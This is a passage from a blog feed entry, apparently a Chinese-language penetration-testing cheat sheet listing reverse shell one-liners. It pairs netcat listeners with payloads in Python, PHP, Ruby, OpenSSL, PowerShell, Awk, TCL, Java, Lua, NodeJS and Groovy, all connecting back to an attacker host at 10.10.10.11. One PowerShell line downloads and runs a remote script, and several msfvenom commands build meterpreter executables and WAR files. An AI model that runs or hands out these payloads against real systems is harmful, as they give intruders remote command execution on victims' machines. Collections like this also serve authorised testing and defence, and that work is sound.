class="line">python -c &#x27;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4444,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>win</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#x27;10.10.10.11&#x27;, 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#x27;except&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&#x27;try&#x27;, (), &#123;&#x27;__enter__&#x27;: lambda self: None, &#x27;__exit__&#x27;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#x27;p2s_thread&#x27;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#x27;s2p_thread&#x27;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#x27;p&#x27;] in [(subprocess.Popen([&#x27;\\windows\\system32\\cmd.exe&#x27;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;p2s&#x27;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#x27;s&#x27;].send(__l[&#x27;p&#x27;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;p2s&#x27;)]][0] for __g[&#x27;s2p&#x27;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#x27;p&#x27;].stdin.write(__l[&#x27;data&#x27;]), __after())[1] if (len(__l[&#x27;data&#x27;]) &gt; 0) else __after())(lambda: __this()) for __l[&#x27;data&#x27;] in [(__l[&#x27;s&#x27;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#x27;s&#x27;], __l[&#x27;p&#x27;] in [(s, p)]][0])(&#123;&#125;), &#x27;s2p&#x27;)]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;threading&#x27;] in [(__import__(&#x27;threading&#x27;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#x27;contextlib&#x27;))&quot;</span><br></pre></td></tr></table></figure><h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>本地监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.10.10.11&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=fsockopen(&quot;10.10.10.11&quot;,4444);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=fsockopen(&quot;10.10.10.11&quot;,4444);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=fsockopen(&quot;10.10.10.11&quot;,4444);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=fsockopen(&quot;10.10.10.11&quot;,4444);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=fsockopen(&quot;10.10.10.11&quot;,4444);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$s=\&#x27;</span>127.0.0.1\<span class="string">&#x27;;$p=4444;@error_reporting(0);@ini_set(&quot;error_log&quot;,NULL);@ini_set(&quot;log_errors&quot;,0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n))&#123;if($x=proc_open(\&#x27;</span>/bin/sh<span class="variable">$IFS</span>-i\<span class="string">&#x27;,array(array(\&#x27;</span>pipe\<span class="string">&#x27;,\&#x27;</span>r\<span class="string">&#x27;),array(\&#x27;</span>pipe\<span class="string">&#x27;,\&#x27;</span>w\<span class="string">&#x27;),array(\&#x27;</span>pipe\<span class="string">&#x27;,\&#x27;</span>w\<span class="string">&#x27;)),$p,getcwd()))&#123;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true)&#123;if(feof($s))die(\&#x27;</span>connection/closed\<span class="string">&#x27;);if(feof($p[1]))die(\&#x27;</span>shell/not/response\<span class="string">&#x27;);$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));&#125;fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);&#125;else&#123;die(&quot;proc_open/disabled&quot;);&#125;&#125;else&#123;die(&quot;not/connect&quot;);&#125;&#x27;</span></span><br><span class="line">// 报错：bash: 未预期的符号“0”附近有语法错误</span><br></pre></td></tr></table></figure><h2 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h2><p>本地监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.10.10.11&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p>win</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">11</span>&quot;,&quot;<span class="number">443</span>&quot;);while(<span class="built_in">cmd</span>=c.gets);IO.popen(<span class="built_in">cmd</span>,&quot;r&quot;)&#123;|io|c.<span class="built_in">print</span> io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure><h2 id="OpenSSL反弹shell"><a href="#OpenSSL反弹shell" class="headerlink" title="OpenSSL反弹shell"></a>OpenSSL反弹shell</h2><p>本地监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --ssl -vv -l -p 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.10.10.11:4444 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure><h2 id="Powershell反弹shell"><a href="#Powershell反弹shell" class="headerlink" title="Powershell反弹shell"></a>Powershell反弹shell</h2><p>本地监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-NoP</span> <span class="literal">-NonI</span> <span class="literal">-W</span> <span class="keyword">Hidden</span> <span class="literal">-Exec</span> Bypass <span class="literal">-Command</span> <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.11&quot;</span>,<span class="number">4444</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.10.11&#x27;,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>); powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">150.161</span> <span class="literal">-p</span> <span class="number">4444</span> <span class="literal">-e</span> cmd</span><br></pre></td></tr></table></figure><h2 id="利用Awk反弹shell"><a href="#利用Awk反弹shell" class="headerlink" title="利用Awk反弹shell"></a>利用Awk反弹shell</h2><p>本地监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;s = &quot;/inet/tcp/0/10.10.10.11/4444&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27; /dev/null</span><br></pre></td></tr></table></figure><h2 id="TCL脚本反弹shell"><a href="#TCL脚本反弹shell" class="headerlink" title="TCL脚本反弹shell"></a>TCL脚本反弹shell</h2><p>本地监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;set s [socket 10.10.10.11 4444];while 42 &#123; puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;&#x27; | tclsh</span><br></pre></td></tr></table></figure><h2 id="Java版本反弹shell"><a href="#Java版本反弹shell" class="headerlink" title="Java版本反弹shell"></a>Java版本反弹shell</h2><p>本地监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><p>Linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=&quot;127.0.0.1&quot;;</span><br><span class="line">int port=4444;</span><br><span class="line">String cmd=&quot;cmd.exe&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><p>创建线程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Thread thread = new Thread()&#123;</span><br><span class="line">    public void run()&#123;</span><br><span class="line">        // Reverse shell here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">thread.start();</span><br></pre></td></tr></table></figure><h2 id="生成War文件反弹shell"><a href="#生成War文件反弹shell" class="headerlink" title="生成War文件反弹shell"></a>生成War文件反弹shell</h2><p>本地监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>使用如下命令生成war文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=4444 -f war &gt; reverse.war</span><br></pre></td></tr></table></figure><p>查看war包中shell的jsp文件名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings reverse.war | grep jsp</span><br></pre></td></tr></table></figure><p>在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell</p><h2 id="使用Lua脚本反弹shell"><a href="#使用Lua脚本反弹shell" class="headerlink" title="使用Lua脚本反弹shell"></a>使用Lua脚本反弹shell</h2><p>本地监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.10.10.11&#x27;,&#x27;4444&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua5.1 -e &#x27;local host, port = &quot;10.10.10.11&quot;, 4444 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#x27;</span><br></pre></td></tr></table></figure><h2 id="NodeJS版本反弹shell"><a href="#NodeJS版本反弹shell" class="headerlink" title="NodeJS版本反弹shell"></a>NodeJS版本反弹shell</h2><p>本地监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p>靶机执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">        cp = require(&quot;child_process&quot;),</span><br><span class="line">        sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(4444, &quot;10.10.10.11&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/; </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&#x27;child_process&#x27;).exec(&#x27;nc -e /bin/sh 10.10.10.11 4444&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-var x = global.process.mainModule.require</span><br><span class="line">-x(&#x27;child_process&#x27;).exec(&#x27;nc 10.10.10.11 4444 -e /bin/bash&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py</span><br></pre></td></tr></table></figure><h2 id="Groovy版本反弹shell"><a href="#Groovy版本反弹shell" class="headerlink" title="Groovy版本反弹shell"></a>Groovy版本反弹shell</h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=&quot;10.10.10.11&quot;;</span><br><span class="line">int port=4444;</span><br><span class="line">String cmd=&quot;cmd.exe&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br></pre></td></tr></table></figure><h2 id="生成Meterpreter反弹Shell"><a href="#生成Meterpreter反弹Shell" class="headerlink" title="生成Meterpreter反弹Shell"></a>生成Meterpreter反弹Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe &gt; reverse.exe</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf &gt;reverse.elf</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f elf &gt; shell.elf</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f exe &gt; shell.exe</span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f macho &gt; shell.macho</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f asp &gt; shell.asp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f raw &gt; shell.jsp</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f war &gt; shell.war</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f raw &gt; shell.py</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f raw &gt; shell.sh</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=<span class="string">&quot;10.10.10.11&quot;</span> LPORT=443 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h2 id="使用Xterm反弹shell"><a href="#使用Xterm反弹shell" class="headerlink" title="使用Xterm反弹shell"></a>使用Xterm反弹shell</h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.10.10.11:1</span><br><span class="line">Xnest :1</span><br><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;shell&quot;&gt;&lt;a href=&quot;#shell&quot; class=&quot;headerlink&quot; title=&quot;shell&quot;&gt;&lt;/a&gt;shell&lt;/h2&gt;&lt;p&gt;shell分为两种，一种是正向shell，另一种是反向shell。&lt;/p&gt;
&lt;p&gt;如果客户端连接服务器，客户端主动连</summary>
      
    
    
    
    <category term="备忘录" scheme="http://lvpsectime.github.io/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
    <category term="shell" scheme="http://lvpsectime.github.io/tags/shell/"/>
    
  </entry>
  
</feed>
